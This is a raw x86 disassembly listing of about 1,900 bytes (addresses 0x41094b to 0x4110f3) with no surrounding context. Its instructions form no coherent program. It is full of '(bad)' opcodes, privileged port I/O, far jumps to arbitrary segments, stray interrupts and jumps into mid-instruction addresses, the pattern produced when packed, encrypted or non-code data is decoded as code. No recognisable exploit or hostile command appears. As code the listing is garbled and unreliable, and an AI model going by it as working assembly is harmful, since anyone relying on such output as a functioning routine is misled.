  41094b:	scas   al,BYTE PTR es:[edi]
  41094c:	add    bl,dl
  41094e:	stos   DWORD PTR es:[edi],eax
  41094f:	dec    ecx
  410950:	test   DWORD PTR [edi+0x78beacac],edi
  410956:	sub    al,0xd4
  410958:	xor    esp,DWORD PTR [ebp-0x7876f305]
  41095e:	in     eax,dx
  41095f:	sbb    DWORD PTR [ecx-0x15782862],eax
  410965:	add    eax,DWORD PTR [ebp+0x171e1342]
  41096b:	stos   DWORD PTR es:[edi],eax
  41096c:	jl     0x4109ca
  41096e:	mov    esi,0x5bfd7067
  410973:	popf   
  410974:	jg     0x4108f6
  410976:	mov    ebp,0xa6d49abe
  41097b:	stos   BYTE PTR es:[edi],al
  41097c:	mov    eax,ds:0x45558b8
  410981:	stos   BYTE PTR es:[edi],al
  410982:	mov    al,ds:0xb9033cd9
  410987:	push   0xffffff8f
  410989:	dec    ecx
  41098a:	in     al,0x47
  41098c:	out    0xc4,eax
  41098e:	pop    ebx
  41098f:	ins    DWORD PTR es:[edi],dx
  410990:	xor    cl,dh
  410992:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410993:	sbb    eax,0xfbe4f36c
  410998:	cld    
  410999:	jmp    0xad87:0x946606c2
  4109a0:	int    0x45
  4109a2:	mov    ebp,0x43e14721
  4109a7:	mov    ebx,0x4a30fbcb
  4109ac:	xchg   ecx,eax
  4109ad:	cmp    esi,DWORD PTR [eax+eiz*2]
  4109b0:	or     eax,0xc71d9104
  4109b5:	das    
  4109b6:	push   eax
  4109b7:	xchg   esi,eax
  4109b8:	ins    DWORD PTR es:[edi],dx
  4109b9:	leave  
  4109ba:	repnz dec ecx
  4109bc:	adc    esi,DWORD PTR [ebp-0x3bc65b1a]
  4109c2:	xchg   edi,eax
  4109c3:	or     DWORD PTR [edx],edi
  4109c5:	(bad)  
  4109c6:	loopne 0x410a38
  4109c8:	mov    eax,DWORD PTR [ebx-0x2d558866]
  4109ce:	adc    esp,esi
  4109d0:	mov    ds:0x706619b8,al
  4109d5:	(bad)  
  4109d6:	ds fcmovu st,st(2)
  4109d9:	mov    edi,0x50092372
  4109de:	jge    0x4109d0
  4109e0:	mov    al,ds:0xada85633
  4109e5:	xor    ebp,DWORD PTR [ebp+ecx*1-0x60]
  4109e9:	call   0xcaa3:0x5c3f3cd2
  4109f0:	mov    cl,0x45
  4109f2:	sbb    DWORD PTR [esi+0x2a787082],ebx
  4109f8:	nop
  4109f9:	scas   al,BYTE PTR es:[edi]
  4109fa:	lods   eax,DWORD PTR ds:[esi]
  4109fb:	fisubr DWORD PTR [edx]
  4109fd:	dec    eax
  4109fe:	xchg   DWORD PTR [eax],esi
  410a00:	out    0xbe,al
  410a02:	sub    BYTE PTR [ecx],ch
  410a04:	je     0x410a09
  410a06:	test   al,0x88
  410a08:	enter  0x17ad,0x57
  410a0c:	jns    0x410a88
  410a0e:	pop    es
  410a0f:	and    ecx,edi
  410a11:	in     eax,dx
  410a12:	cmp    DWORD PTR [ebx+0x51],ebp
  410a15:	in     eax,0x67
  410a17:	scas   eax,DWORD PTR es:[edi]
  410a18:	push   0x28
  410a1a:	jmp    0x635a9c12
  410a1f:	and    eax,0xca64e427
  410a24:	dec    esp
  410a25:	push   esp
  410a26:	sub    al,0x42
  410a28:	ret    0x608e
  410a2b:	xchg   esp,eax
  410a2c:	pop    es
  410a2d:	inc    ebx
  410a2e:	stos   DWORD PTR es:[edi],eax
  410a2f:	dec    esi
  410a30:	sbb    al,0x1c
  410a32:	stc    
  410a33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410a34:	ret    0x8f12
  410a37:	jo     0x410a81
  410a39:	sbb    al,0x59
  410a3b:	sub    bh,cl
  410a3d:	inc    eax
  410a3e:	xchg   edi,eax
  410a3f:	rol    DWORD PTR [edx],1
  410a41:	cmp    ebx,edx
  410a43:	sbb    eax,0xa07bc73
  410a48:	lds    eax,FWORD PTR [edi+0x7bb0537b]
  410a4e:	cmp    al,0xd
  410a50:	and    dl,BYTE PTR [ebp-0x1737aff5]
  410a56:	mov    ebx,0xe67eae31
  410a5b:	call   0x1e33818a
  410a60:	xor    eax,0xb1ea0ffd
  410a65:	jno    0x410a3a
  410a67:	(bad)  
  410a68:	aas    
  410a69:	cmp    ebp,DWORD PTR [edx+0x4d]
  410a6c:	add    edi,DWORD PTR [ecx-0x42]
  410a6f:	ret    0x7d23
  410a72:	(bad)  
  410a73:	or     al,0x7c
  410a75:	imul   esp,DWORD PTR [edi+0x14940e7b],0xffffff9a
  410a7c:	fdivr  st(5),st
  410a7e:	push   cs
  410a7f:	pop    ds
  410a80:	xor    DWORD PTR [edi-0x68],edi
  410a83:	ret    
  410a84:	xchg   DWORD PTR [eax],esp
  410a86:	mov    eax,0x5a4ba552
  410a8b:	mov    esi,0xc9292710
  410a90:	dec    esi
  410a91:	pop    esi
  410a92:	pop    edi
  410a93:	push   0x359361df
  410a98:	cmc    
  410a99:	xlat   BYTE PTR ds:[ebx]
  410a9a:	mov    bh,0xa6
  410a9c:	cmc    
  410a9d:	add    al,0xf1
  410a9f:	dec    DWORD PTR [esi]
  410aa1:	or     dh,dl
  410aa3:	adc    eax,0xbcf1a24a
  410aa8:	cmp    BYTE PTR [esi-0x26],ch
  410aab:	sub    cl,dl
  410aad:	aas    
  410aae:	push   ebx
  410aaf:	loope  0x410b30
  410ab1:	lods   eax,DWORD PTR ds:[esi]
  410ab2:	ins    DWORD PTR es:[edi],dx
  410ab3:	es ja  0x410ab5
  410ab6:	(bad)  
  410ab7:	xor    dh,al
  410ab9:	js     0x410a81
  410abb:	mov    cl,BYTE PTR [edi+0x1958fdf3]
  410ac1:	(bad)  
  410ac2:	fcomp  DWORD PTR [ecx-0x4d48194d]
  410ac8:	jmp    DWORD PTR [edi+0x30]
  410acb:	pop    DWORD PTR [edx+edx*8+0x642f14f7]
  410ad2:	jecxz  0x410acc
  410ad4:	or     dh,dh
  410ad6:	test   BYTE PTR [ebx],bh
  410ad8:	out    dx,al
  410ad9:	jl     0x410b02
  410adb:	retf   
  410adc:	outs   dx,BYTE PTR ds:[esi]
  410add:	mov    eax,ds:0xe8443dbb
  410ae2:	test   BYTE PTR [ebx],cl
  410ae4:	sbb    bh,0xb3
  410ae7:	fadd   DWORD PTR [eax+0x65]
  410aea:	bound  edx,QWORD PTR ds:0xc6abd2bf
  410af0:	mov    ch,0xc9
  410af2:	popa   
  410af3:	loop   0x410a7f
  410af5:	out    0x4b,eax
  410af7:	jecxz  0x410a9e
  410af9:	xchg   DWORD PTR gs:[ecx-0x3f8fc0c4],esi
  410b00:	sub    BYTE PTR [edx-0x5fc31953],bl
  410b06:	test   ah,cl
  410b08:	nop
  410b09:	cmp    DWORD PTR [eax],esi
  410b0b:	cwde   
  410b0c:	fidiv  WORD PTR [esi+ebx*4]
  410b0f:	jns    0x410aee
  410b11:	lea    edx,[esp+ebx*1]
  410b14:	pop    es
  410b15:	retf   
  410b16:	inc    ebp
  410b17:	test   ecx,ebx
  410b19:	ret    0x9f5e
  410b1c:	aad    0xd6
  410b1e:	lahf   
  410b1f:	add    eax,eax
  410b21:	pusha  
  410b22:	setl   ah
  410b25:	sub    DWORD PTR [ebp-0x60],ebx
  410b28:	jecxz  0x410b80
  410b2a:	mov    eax,0xb646fff
  410b2f:	test   eax,0x32547c53
  410b34:	push   ss
  410b35:	test   BYTE PTR [edx-0x5],al
  410b38:	sbb    ebx,DWORD PTR [eax+0x41c560c6]
  410b3e:	(bad)  
  410b40:	dec    edi
  410b41:	xor    al,0x1b
  410b43:	jge    0x410bb7
  410b45:	mov    cl,0x2a
  410b47:	or     al,0xa4
  410b49:	out    dx,al
  410b4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410b4b:	xor    al,0xbf
  410b4d:	add    BYTE PTR [edx],bh
  410b4f:	mov    WORD PTR [ebx+0x3a81960e],?
  410b55:	cmp    bh,BYTE PTR [ecx]
  410b57:	std    
  410b58:	dec    edx
  410b59:	lahf   
  410b5a:	jo     0x410b9c
  410b5c:	icebp  
  410b5d:	int    0x20
  410b5f:	xchg   ebp,eax
  410b60:	loope  0x410bc6
  410b62:	or     DWORD PTR [ebp-0x65],0x56062f4
  410b69:	pushf  
  410b6a:	cdq    
  410b6b:	lods   al,BYTE PTR ds:[esi]
  410b6c:	sar    BYTE PTR [esi+edi*1-0x6f2a6ade],1
  410b73:	or     BYTE PTR [edi],cl
  410b75:	mov    ah,0x7f
  410b77:	sbb    al,0x17
  410b79:	mov    ebx,0xcad90218
  410b7e:	lea    ebp,[ecx+0x4d40068c]
  410b84:	fcom   DWORD PTR [esi+0x54885b44]
  410b8a:	aam    0xaa
  410b8c:	adc    esi,ebx
  410b8e:	scas   al,BYTE PTR es:[edi]
  410b8f:	out    dx,al
  410b90:	push   eax
  410b91:	out    0x6,eax
  410b93:	dec    eax
  410b94:	loop   0x410b2e
  410b96:	xor    BYTE PTR [esi-0x63],bl
  410b99:	out    0x2f,eax
  410b9b:	dec    esi
  410b9c:	retf   0x6880
  410b9f:	(bad)  
  410ba1:	jle    0x410b8d
  410ba3:	pushf  
  410ba4:	pop    esp
  410ba5:	push   es
  410ba6:	xchg   ebx,eax
  410ba7:	push   0x24
  410ba9:	std    
  410baa:	stos   DWORD PTR es:[edi],eax
  410bab:	jno    0x410c28
  410bad:	rcl    DWORD PTR [esi],cl
  410baf:	xchg   esp,eax
  410bb0:	sub    eax,0xa5b8c845
  410bb5:	mov    ebx,0xf452e5c5
  410bba:	mov    edi,0xf3a8c0ba
  410bbf:	adc    al,0x98
  410bc1:	dec    ebx
  410bc2:	push   0x6762fc44
  410bc7:	jle    0x410b6a
  410bc9:	ins    BYTE PTR es:[edi],dx
  410bca:	sub    eax,0x20143ae
  410bcf:	nop
  410bd0:	mov    dl,0x36
  410bd2:	fcom   DWORD PTR ds:0x8a0598a2
  410bd8:	xchg   ebp,eax
  410bd9:	mov    cl,0xe
  410bdb:	xchg   ecx,eax
  410bdc:	cmp    eax,ebx
  410bde:	mov    esi,0x7b2a3e1d
  410be3:	inc    ebx
  410be4:	aaa    
  410be5:	push   0x6e
  410be7:	or     dl,BYTE PTR [edx+0x64]
  410bea:	(bad)  [ecx+0xe]
  410bed:	mov    ah,0x77
  410bef:	ins    DWORD PTR es:[edi],dx
  410bf0:	jl     0x410b7c
  410bf2:	and    eax,0x9c44ed48
  410bf7:	mov    dh,0x8c
  410bf9:	adc    eax,0xce411012
  410bfe:	(bad)  
  410bff:	push   ebx
  410c00:	xchg   edi,eax
  410c01:	dec    ecx
  410c02:	(bad)  
  410c03:	pop    ebx
  410c04:	or     DWORD PTR [edx-0xd2acf39],eax
  410c0a:	js     0x410bf8
  410c0c:	dec    eax
  410c0d:	hlt    
  410c0e:	rol    BYTE PTR [edi+0x4c],0x6e
  410c12:	ins    BYTE PTR es:[edi],dx
  410c13:	sub    ch,BYTE PTR [esi+0x6]
  410c16:	mov    eax,0xe73b27a8
  410c1b:	dec    edx
  410c1c:	dec    eax
  410c1d:	sub    al,0x9d
  410c1f:	inc    esp
  410c20:	shr    BYTE PTR [esi-0x19],1
  410c23:	mov    eax,0xe74ab142
  410c28:	jb     0x410c94
  410c2a:	int3   
  410c2b:	test   eax,0xbfb570fb
  410c30:	xor    ch,bl
  410c32:	and    ch,ch
  410c34:	adc    ecx,DWORD PTR [eax+0x76]
  410c37:	jge    0x410c39
  410c39:	imul   ecx,DWORD PTR [esp+ebx*1+0x639f2d05],0xa660914
  410c44:	add    al,0x37
  410c46:	mov    edi,0x83698f60
  410c4b:	hlt    
  410c4c:	cmp    BYTE PTR [eax+0x7f3b901c],al
  410c52:	cmc    
  410c53:	std    
  410c54:	jp     0x410c90
  410c56:	jo     0x410cbe
  410c58:	and    al,0x93
  410c5a:	jo     0x410c79
  410c5c:	mov    esi,DWORD PTR [edi+0x442dffe1]
  410c62:	hlt    
  410c63:	nop
  410c64:	pop    edx
  410c65:	pop    ebp
  410c66:	xor    dl,BYTE PTR [esi+edx*1+0x31]
  410c6a:	call   DWORD PTR [edx+0x435e4b5f]
  410c70:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410c71:	mov    dl,0x23
  410c73:	jns    0x410c05
  410c75:	lods   al,BYTE PTR ds:[esi]
  410c76:	out    dx,eax
  410c77:	fisttp QWORD PTR [ecx]
  410c79:	xchg   esi,eax
  410c7a:	in     eax,dx
  410c7b:	or     ch,ah
  410c7d:	add    dh,bl
  410c7f:	sub    ch,BYTE PTR [edi]
  410c81:	(bad)  
  410c82:	xchg   edx,eax
  410c83:	xchg   edx,eax
  410c84:	xchg   edi,eax
  410c85:	outs   dx,DWORD PTR ds:[esi]
  410c86:	xchg   DWORD PTR [edx],eax
  410c88:	das    
  410c89:	lods   al,BYTE PTR ds:[esi]
  410c8a:	cmp    esi,DWORD PTR [eax+0x31]
  410c8d:	(bad)  
  410c8e:	pop    esi
  410c8f:	popf   
  410c90:	pop    ebx
  410c91:	adc    DWORD PTR [edx+ebp*2+0x416dcac1],ebp
  410c98:	dec    eax
  410c99:	lods   eax,DWORD PTR ds:[esi]
  410c9a:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  410c9c:	xchg   ebx,eax
  410c9d:	or     esp,DWORD PTR [ebp+0x7cb0cc60]
  410ca3:	gs pop ss
  410ca5:	shr    BYTE PTR [eax+0x6d],0xa8
  410ca9:	out    dx,eax
  410caa:	iret   
  410cab:	xchg   ebp,eax
  410cac:	(bad)  
  410cae:	or     al,0x13
  410cb0:	pop    esi
  410cb1:	push   esi
  410cb2:	shl    dl,0xd6
  410cb5:	popf   
  410cb6:	ror    BYTE PTR [esi],cl
  410cb8:	xchg   ecx,eax
  410cb9:	pop    es
  410cba:	pop    edx
  410cbb:	jb     0x410c86
  410cbd:	aas    
  410cbe:	nop
  410cbf:	(bad)  
  410cc0:	test   eax,0xa13c1fbb
  410cc5:	xchg   edi,eax
  410cc6:	dec    DWORD PTR [ecx+ebp*4+0xc]
  410cca:	mov    WORD PTR [edx-0x23],ds
  410ccd:	cwde   
  410cce:	jp     0x410d44
  410cd0:	(bad)  
  410cd1:	sub    al,0x60
  410cd3:	(bad)  
  410cd4:	and    eax,0x8de3924b
  410cd9:	cmp    DWORD PTR cs:[esi-0x58f7796c],ebp
  410ce0:	repz lock mov dl,0x54
  410ce4:	push   ebp
  410ce5:	or     eax,0xddd4c664
  410cea:	js     0x410cbb
  410cec:	jo     0x410cce
  410cee:	sub    DWORD PTR [ecx-0xc5ac5a6],ecx
  410cf4:	ja     0x410d5d
  410cf6:	adc    ebx,DWORD PTR [esi-0x33]
  410cf9:	add    al,0xc
  410cfb:	vpmacsdqh ymm13,ymm7,ymm1,ymm5
  410d01:	and    ebx,edi
  410d03:	pop    esi
  410d04:	fidivr WORD PTR [esi-0x7c5276ec]
  410d0a:	or     al,0x79
  410d0c:	inc    edx
  410d0d:	mov    ds:0xc09b0f75,eax
  410d12:	pop    edx
  410d13:	cmp    bl,al
  410d15:	jno    0x410d66
  410d17:	enter  0x9505,0x8c
  410d1b:	repnz imul ecx,eax,0x0
  410d1f:	sub    eax,0xb05d8c97
  410d24:	push   es
  410d25:	(bad)  
  410d26:	dec    edi
  410d27:	xlat   BYTE PTR ds:[ebx]
  410d28:	icebp  
  410d29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410d2a:	dec    esp
  410d2b:	pop    ebp
  410d2c:	mov    bh,0x28
  410d2e:	stos   DWORD PTR es:[edi],eax
  410d2f:	les    eax,FWORD PTR [ecx+edi*4+0x6fc067b1]
  410d36:	dec    edx
  410d37:	add    bl,al
  410d39:	int3   
  410d3a:	dec    esp
  410d3b:	adc    eax,esp
  410d3d:	sar    BYTE PTR [edx+0x721fdcec],0x3a
  410d44:	mov    ds:0x959572df,al
  410d49:	test   eax,0x7e997e10
  410d4e:	clc    
  410d4f:	clc    
  410d50:	mov    cl,0xfa
  410d52:	dec    ebp
  410d53:	inc    ecx
  410d54:	cwde   
  410d55:	data16 lahf 
  410d57:	into   
  410d58:	int    0xe9
  410d5a:	cmp    al,0x6b
  410d5c:	lea    edi,[eax-0x49]
  410d5f:	stos   DWORD PTR es:[edi],eax
  410d60:	and    al,BYTE PTR [edx]
  410d62:	push   ebx
  410d63:	mov    ebp,0xef5b9857
  410d68:	jmp    0x8f0ad1b6
  410d6d:	sbb    eax,0x996811f6
  410d72:	sbb    dh,ah
  410d74:	mov    ebp,0x976338f4
  410d79:	pop    ebp
  410d7a:	jmp    0x410daf
  410d7c:	cld    
  410d7d:	dec    esp
  410d7e:	push   esi
  410d7f:	mov    ds:0x12847d53,eax
  410d84:	fwait
  410d85:	test   eax,0xb3876309
  410d8a:	xchg   esp,eax
  410d8b:	popf   
  410d8c:	or     DWORD PTR [eax+ebp*1],ebx
  410d8f:	(bad)  
  410d90:	es push esi
  410d92:	jo     0x410d2a
  410d94:	xor    al,0x6b
  410d96:	mov    edx,0xa68e4e02
  410d9b:	aaa    
  410d9c:	fwait
  410d9d:	xchg   edx,eax
  410d9e:	ja     0x410d39
  410da0:	and    BYTE PTR [edi+esi*4-0x25],dh
  410da4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410da5:	in     al,0x41
  410da7:	scas   al,BYTE PTR es:[edi]
  410da8:	sub    eax,0xcb1cd602
  410dad:	mov    dl,0x22
  410daf:	in     al,dx
  410db0:	inc    edi
  410db1:	sbb    BYTE PTR [ebp-0x76],dl
  410db4:	pop    ds
  410db5:	inc    edi
  410db6:	pop    eax
  410db7:	mov    dl,0x60
  410db9:	push   ds
  410dba:	test   BYTE PTR [ebx+eiz*8+0x399cf935],bh
  410dc1:	sub    al,0x95
  410dc3:	outs   dx,BYTE PTR ds:[esi]
  410dc4:	sub    DWORD PTR [edi],ecx
  410dc6:	out    dx,al
  410dc7:	jg     0x410d57
  410dc9:	test   DWORD PTR [ebx+edi*8],eax
  410dcc:	retf   0x43f4
  410dcf:	imul   ecx,DWORD PTR [ebx+0x5c],0xffffffcd
  410dd3:	(bad)  
  410dd4:	push   edi
  410dd5:	loop   0x410e3e
  410dd7:	shr    ch,1
  410dd9:	jo     0x410da1
  410ddb:	lahf   
  410ddc:	ja     0x410e08
  410dde:	cmp    cl,bh
  410de0:	mov    cl,0x8e
  410de2:	mov    esp,0xe76e3169
  410de7:	push   eax
  410de8:	jnp    0x410e31
  410dea:	(bad)  
  410deb:	ror    DWORD PTR [edi+0x27],1
  410dee:	scas   al,BYTE PTR es:[edi]
  410def:	inc    edi
  410df0:	cld    
  410df1:	stos   BYTE PTR es:[edi],al
  410df2:	push   ss
  410df3:	pop    ds
  410df4:	push   cs
  410df5:	bound  edx,QWORD PTR [edx]
  410df7:	cli    
  410df8:	sbb    eax,0xac975b1
  410dfd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410dfe:	in     al,0x24
  410e00:	mov    ebp,0x489c12fa
  410e05:	dec    al
  410e07:	and    dl,BYTE PTR [ebx+eax*2-0x2d]
  410e0b:	inc    esp
  410e0c:	mov    ebp,DWORD PTR [ecx]
  410e0e:	es shl cx,cl
  410e12:	dec    ecx
  410e13:	add    cl,BYTE PTR [eax-0x7374c2ad]
  410e19:	mov    eax,ds:0x40a9819b
  410e1e:	adc    eax,0x46186d1b
  410e23:	sbb    eax,0xdcc2e8a7
  410e28:	push   cs
  410e29:	and    bl,BYTE PTR [ebp-0x3ef17b70]
  410e2f:	sbb    DWORD PTR [edi],0xaa27208b
  410e35:	add    ebp,ebx
  410e37:	adc    eax,0x85b22fc6
  410e3c:	(bad)  
  410e3d:	xchg   esi,eax
  410e3e:	ret    
  410e3f:	sub    ecx,0x4a1c3036
  410e45:	mov    eax,0xcc2522f7
  410e4a:	pop    es
  410e4b:	dec    ebx
  410e4c:	hlt    
  410e4d:	or     BYTE PTR [ebp-0x148f7ff0],0xa
  410e54:	retf   
  410e55:	lock leave 
  410e57:	jnp    0x410df4
  410e59:	std    
  410e5a:	in     eax,0x74
  410e5c:	cld    
  410e5d:	aaa    
  410e5e:	(bad)  
  410e5f:	rcl    BYTE PTR ds:0x12a042fd,0xb2
  410e66:	xchg   esi,eax
  410e67:	mov    ch,0xbf
  410e69:	and    eax,0xc2fe8578
  410e6e:	(bad)  
  410e6f:	sti    
  410e70:	xchg   ebp,eax
  410e71:	(bad)  
  410e72:	out    dx,al
  410e73:	mov    bl,0x7f
  410e75:	pop    ebp
  410e76:	cmp    BYTE PTR [edi],0x4f
  410e79:	and    bh,BYTE PTR [esp+edi*1-0x6bb4be72]
  410e80:	xor    BYTE PTR [eax-0x4c],dl
  410e83:	in     al,0x4b
  410e85:	lods   al,BYTE PTR ds:[esi]
  410e86:	js     0x410ed6
  410e88:	in     eax,0x89
  410e8a:	or     eax,0x6663cc17
  410e8f:	cmc    
  410e90:	cld    
  410e91:	loop   0x410ef5
  410e93:	rol    BYTE PTR [ebx-0x25],0xfd
  410e97:	stc    
  410e98:	call   0xe702:0x96285822
  410e9f:	or     dh,BYTE PTR [eax+0x481b98eb]
  410ea5:	int    0x7f
  410ea7:	pop    ebp
  410ea8:	jnp    0x410f0f
  410eaa:	lahf   
  410eab:	mov    edx,0x5df99ca6
  410eb0:	mov    bl,0xd0
  410eb2:	les    ebx,FWORD PTR [eax]
  410eb4:	add    ebp,DWORD PTR [eax]
  410eb6:	ins    DWORD PTR es:[edi],dx
  410eb7:	rol    DWORD PTR [esi],0xab
  410eba:	sbb    ebx,DWORD PTR [eax+0x6f]
  410ebd:	fst    DWORD PTR [eax+0x2e85d337]
  410ec3:	add    BYTE PTR [eax+0x506f56db],dh
  410ec9:	jne    0x410ed8
  410ecb:	imul   esi,DWORD PTR [edx-0x6c],0xffffffe2
  410ecf:	imul   edx,ecx,0x51
  410ed2:	cmp    eax,eax
  410ed4:	add    BYTE PTR [ebp+0x3d],al
  410ed7:	cmp    edi,DWORD PTR [edi+0x73]
  410eda:	xchg   esp,eax
  410edb:	pop    esi
  410edc:	cmp    BYTE PTR [esi],ah
  410ede:	mov    eax,ds:0xd4e108d2
  410ee3:	iret   
  410ee4:	sar    BYTE PTR [eax+esi*1],0xb3
  410ee8:	ss jl  0x410f0c
  410eeb:	fisttp WORD PTR [ecx+0x30909ef]
  410ef1:	cmp    edx,DWORD PTR [edi]
  410ef3:	scas   eax,DWORD PTR es:[edi]
  410ef4:	dec    esp
  410ef5:	shl    DWORD PTR [edx+ebp*2],1
  410ef8:	bound  eax,QWORD PTR [ebp+0x65b98b1c]
  410efe:	loop   0x410eaa
  410f00:	pop    ecx
  410f01:	pop    edi
  410f02:	std    
  410f03:	push   es
  410f04:	sbb    eax,0xddeb6d14
  410f09:	iret   
  410f0a:	dec    esi
  410f0b:	popa   
  410f0c:	sub    ch,BYTE PTR [ebp+0x2c]
  410f0f:	or     ecx,DWORD PTR [eax+0x100d28c5]
  410f15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410f16:	jmp    0x410efe
  410f18:	cli    
  410f19:	(bad)
  410f1c:	ror    BYTE PTR [edx+esi*1],1
  410f1f:	pop    esp
  410f20:	int    0xb9
  410f22:	stos   DWORD PTR es:[edi],eax
  410f23:	push   es
  410f24:	sbb    edx,ebx
  410f26:	jl     0x410ea9
  410f28:	and    al,0xdb
  410f2a:	ja     0x410f25
  410f2c:	mov    BYTE PTR [edx],ch
  410f2e:	rcr    DWORD PTR [ebx],cl
  410f30:	cmp    BYTE PTR [eax+0x47],bh
  410f33:	jb     0x410fb0
  410f35:	inc    esp
  410f36:	adc    eax,0x6bc59517
  410f3b:	xor    DWORD PTR [edi-0x5a],0x5b
  410f3f:	aaa    
  410f40:	cmp    al,0x39
  410f42:	mov    bh,0x5
  410f44:	push   0xbc37c3ae
  410f49:	inc    esi
  410f4a:	and    al,0x99
  410f4c:	adc    BYTE PTR [ebp+0x2a],al
  410f4f:	push   eax
  410f50:	jmp    0x410f77
  410f52:	add    dl,bh
  410f54:	loopne 0x410fa9
  410f56:	jle    0x410f8b
  410f58:	add    BYTE PTR [ebp+0x2167a0af],0x78
  410f5f:	xchg   DWORD PTR [edi+0x57],ecx
  410f62:	out    0x8e,eax
  410f64:	sub    eax,0xf32931c3
  410f69:	mov    ds:0x6501e320,al
  410f6e:	in     eax,0xe4
  410f70:	or     eax,0x5345dc3a
  410f75:	outs   dx,DWORD PTR ds:[esi]
  410f76:	xor    BYTE PTR [edi+0x1e4e246c],ch
  410f7c:	push   0xc4beddf
  410f81:	repnz sub eax,0xe574a010
  410f87:	mov    edx,0x3513dbb2
  410f8c:	and    DWORD PTR [eiz*8+0x7be8d233],esi
  410f93:	vpsubsw xmm1,xmm5,XMMWORD PTR [ebp+0x71]
  410f98:	sub    DWORD PTR [eax-0x32],ecx
  410f9b:	lahf   
  410f9c:	sub    BYTE PTR [esi+0x7b],ch
  410f9f:	push   esi
  410fa0:	mov    al,0xd2
  410fa2:	and    al,0x10
  410fa4:	push   ecx
  410fa5:	jmp    0x580b4906
  410faa:	mov    ebx,0x7141682d
  410faf:	push   es
  410fb0:	in     eax,dx
  410fb1:	sbb    DWORD PTR [edx+0x493beb4e],ebx
  410fb7:	or     ch,bl
  410fb9:	ds jp  0x410fec
  410fbc:	cld    
  410fbd:	fs cmp al,0x72
  410fc0:	mov    dh,0xe9
  410fc2:	add    DWORD PTR [edx-0x6370cacc],edx
  410fc8:	cmp    BYTE PTR [edx-0x76],0x68
  410fcc:	mov    esp,edi
  410fce:	jmp    0x8aa3e23c
  410fd3:	xchg   ebp,eax
  410fd4:	jmp    0xa9e0:0xe24b454e
  410fdb:	loope  0x410f5e
  410fdd:	imul   edi,DWORD PTR [ebp+0x7e],0x5c
  410fe1:	fcomp  QWORD PTR [ebp+0x38]
  410fe4:	fisttp WORD PTR [ebx-0x60de0537]
  410fea:	push   cs
  410feb:	xlat   BYTE PTR ds:[ebx]
  410fec:	js     0x410fb4
  410fee:	js     0x410fd3
  410ff0:	je     0x41101d
  410ff2:	jmp    0xab53ff62
  410ff7:	jmp    0xd2d40924
  410ffc:	push   cs
  410ffd:	push   esp
  410ffe:	mov    DWORD PTR ds:0x1ca04ecb,esp
  411004:	mov    DWORD PTR [ebx-0x37106eed],ecx
  41100a:	jne    0x411037
  41100c:	ds cs fcomip st,st(6)
  411010:	cld    
  411011:	test   edx,0xabd93ef5
  411017:	jae    0x410fa9
  411019:	popa   
  41101a:	xor    ah,ah
  41101c:	dec    edi
  41101d:	jg     0x410fb9
  41101f:	mov    ebp,DWORD PTR [ecx+0x3582cdb2]
  411025:	sub    esi,DWORD PTR ds:0xb8cba211
  41102b:	add    DWORD PTR [ecx-0x29],ebp
  41102e:	test   BYTE PTR [ebp+0x1a4376ff],bl
  411034:	sub    cl,BYTE PTR [edx+ebx*2+0x37]
  411038:	jne    0x410ff3
  41103a:	pop    es
  41103b:	xor    BYTE PTR [ecx-0xd],bh
  41103e:	cld    
  41103f:	aaa    
  411040:	iret   
  411041:	pop    esp
  411042:	xchg   DWORD PTR [edx+0x4f],esp
  411045:	shr    BYTE PTR [ecx],1
  411047:	leave  
  411048:	cmc    
  411049:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41104a:	rcl    BYTE PTR [ebp+0x2b8d3ed4],1
  411050:	adc    esi,DWORD PTR ds:0x4de94dec
  411056:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411057:	add    bl,dh
  411059:	jle    0x411062
  41105b:	pop    ecx
  41105c:	loope  0x411049
  41105e:	dec    edi
  41105f:	scas   al,BYTE PTR es:[edi]
  411060:	pmaxub mm1,mm0
  411063:	xor    esp,DWORD PTR [esp+ebp*2]
  411066:	xchg   ebx,eax
  411067:	jno    0x411008
  411069:	stos   DWORD PTR es:[edi],eax
  41106a:	inc    esp
  41106b:	loope  0x4110e1
  41106d:	pop    ds
  41106e:	and    al,0x78
  411070:	test   edx,0xc8f90bcd
  411076:	xor    al,0xc4
  411078:	mov    ebx,0xc426ec95
  41107d:	mov    esp,0x784f519f
  411082:	inc    eax
  411083:	pop    esi
  411084:	adc    al,0x90
  411086:	cmp    al,0xca
  411088:	imul   eax,DWORD PTR ss:[eax],0xffffffee
  41108c:	dec    edx
  41108d:	icebp  
  41108e:	mov    al,ds:0x9123299a
  411093:	add    BYTE PTR [edx],bh
  411095:	(bad)  
  411096:	mov    al,0x46
  411098:	and    eax,0x86d6107b
  41109d:	jmp    0xc45:0x98b8094e
  4110a4:	sub    dl,ah
  4110a6:	and    ebx,0x42
  4110a9:	xchg   DWORD PTR [edx],ebx
  4110ab:	jle    0x4110b8
  4110ad:	rol    edx,0xe2
  4110b0:	nop
  4110b1:	pop    edi
  4110b2:	xchg   BYTE PTR [edx],ah
  4110b4:	add    bh,BYTE PTR [ecx-0x71]
  4110b7:	aaa    
  4110b8:	test   eax,0x6a888ac9
  4110bd:	ret    
  4110be:	xchg   ebp,eax
  4110bf:	xor    DWORD PTR [edx],edx
  4110c1:	xchg   esi,eax
  4110c2:	dec    eax
  4110c3:	push   ds
  4110c4:	xchg   esi,eax
  4110c5:	lods   al,BYTE PTR ds:[esi]
  4110c6:	or     dl,BYTE PTR [eax+edi*2-0x58750b56]
  4110cd:	call   0x7776b930
  4110d2:	mov    eax,0x63aa474e
  4110d7:	ror    DWORD PTR [ebx],cl
  4110d9:	xchg   ecx,eax
  4110da:	imul   edx,DWORD PTR [ebx+0x3b],0xffffffd9
  4110de:	daa    
  4110df:	cmp    ecx,DWORD PTR [esi+eax*2+0x4eb0e6b4]
  4110e6:	or     ch,0x32
  4110e9:	psubsb mm0,QWORD PTR [edx+eax*8+0x40343ffa]
  4110f1:	jne    0x411127
  4110f3:	(bad)  
